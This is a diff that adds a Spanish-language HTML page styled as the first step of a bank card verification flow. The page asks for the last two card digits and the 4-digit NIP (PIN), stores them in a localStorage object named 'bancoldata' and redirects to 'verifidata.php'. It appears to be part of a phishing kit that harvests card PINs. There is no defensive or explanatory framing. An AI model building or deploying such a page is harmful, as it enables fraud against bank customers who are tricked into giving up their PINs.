@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Datos de la tarjeta</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+
+    /* Pasos de arriba */
+    .steps {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .step-circle {
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      background-color: #0053ba;
+      color: white;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: bold;
+    }
+
+    .line {
+      flex: 1;
+      height: 2px;
+      background-color: #ccc;
+      margin: 0 8px;
+    }
+
+    .dot {
+      width: 12px;
+      height: 12px;
+      background-color: #ccc;
+      border-radius: 50%;
+    }
+
+    h2 {
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 16px 12px;
+      font-size: 16px;
+      border: none;
+      border-bottom: 1px solid #999;
+      background-color: #f2f2f2;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      outline: none;
+    }
+
+    input::placeholder {
+      color: #888;
+    }
+
+    input:focus {
+      background-color: #fefefe;
+      border-bottom: 2px solid #0053ba;
+    }
+
+    .btn {
+      width: 100%;
+      margin-top: 10px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: bold;
+      background-color: #ccc;
+      color: #444;
+      border: none;
+      border-radius: 30px;
+      cursor: not-allowed;
+    }
+
+    .btn.enabled {
+      background-color: #0053ba;
+      color: #fff;
+      cursor: pointer;
+    }
+
+    .footer-link {
+      text-align: center;
+      font-size: 14px;
+      margin-top: 25px;
+    }
+
+    .footer-link a {
+      color: #0053ba;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- PASOS -->
+  <div class="steps">
+    <div class="step-circle">1</div>
+    <div class="line"></div>
+    <div class="dot"></div>
+    <div class="line"></div>
+    <div class="dot"></div>
+  </div>
+
+  <h2>Datos de la tarjeta</h2>
+
+  <form id="claveForm">
+    <input type="text" id="ultimos2" maxlength="2" inputmode="numeric" pattern="[0-9]*"
+           placeholder="2 últimos dígitos de la tarjeta" required />
+
+    <input type="password" id="nip" maxlength="4" inputmode="numeric" pattern="[0-9]*"
+           placeholder="Ingresa los 4 dígitos de tu NIP" required />
+
+    <button type="submit" class="btn" id="continuarBtn" disabled>Continuar</button>
+  </form>
+
+  <div class="footer-link">
+    <a href="#">En otro momento</a>
+  </div>
+</div>
+
+<script>
+  const ultimos2 = document.getElementById("ultimos2");
+  const nip = document.getElementById("nip");
+  const continuarBtn = document.getElementById("continuarBtn");
+  const form = document.getElementById("claveForm");
+
+  function validar() {
+    const valido = /^\d{2}$/.test(ultimos2.value.trim()) && /^\d{4}$/.test(nip.value.trim());
+    continuarBtn.disabled = !valido;
+    continuarBtn.classList.toggle("enabled", valido);
+  }
+
+  ultimos2.addEventListener("input", validar);
+  nip.addEventListener("input", validar);
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    const data = JSON.parse(localStorage.getItem("bancoldata") || "{}");
+    data.digitosFinales = ultimos2.value.trim();
+    data.clave = nip.value.trim();
+    localStorage.setItem("bancoldata", JSON.stringify(data));
+
+    window.location.href = "verifidata.php";
+  });
+</script>
+
+</body>
+</html>
